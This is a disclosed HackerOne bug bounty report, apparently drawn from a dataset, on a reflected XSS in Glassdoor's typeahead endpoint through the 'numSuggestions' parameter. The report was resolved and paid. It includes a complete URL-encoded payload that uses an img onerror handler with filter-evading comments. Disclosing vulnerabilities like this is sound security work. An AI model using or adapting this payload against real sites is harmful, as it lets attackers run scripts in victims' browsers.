---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1042486'
original_report_id: '1042486'
title: Reflected XSS at https://www.glassdoor.com/ via the 'numSuggestions' parameter
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: glassdoor
created_at: '2020-11-24T14:25:35.370Z'
disclosed_at: '2020-12-14T15:27:55.885Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 28
asset_identifier: https://www.glassdoor.com/*
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS at https://www.glassdoor.com/ via the 'numSuggestions' parameter

## Metadata

- HackerOne Report ID: 1042486
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: glassdoor
- Disclosed At: 2020-12-14T15:27:55.885Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi there,
I have found the xss vulnerability at: https://www.glassdoor.com/ via parameter: `numSuggestions`

**Summary:** 
Affected Parameter: `numSuggestions`

**Browsers tested:** Firefox, Chrome, Edge (latest version)

## Steps To Reproduce:
Go to: `https://www.glassdoor.com/searchsuggest/typeahead?numSuggestions=8rk3s6%22%3Cimg/**/src%3D%22x%22/**/onx%3D%22%22/**/onerror%3D%22alert%60l0cpd%60%22%3Ef9y60`
{F1092213}

## Supporting Material/References (screenshots, logs, videos):
{F1092214} 


Regards,
@l0cpd

## Impact

The attacker can execute JS code.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
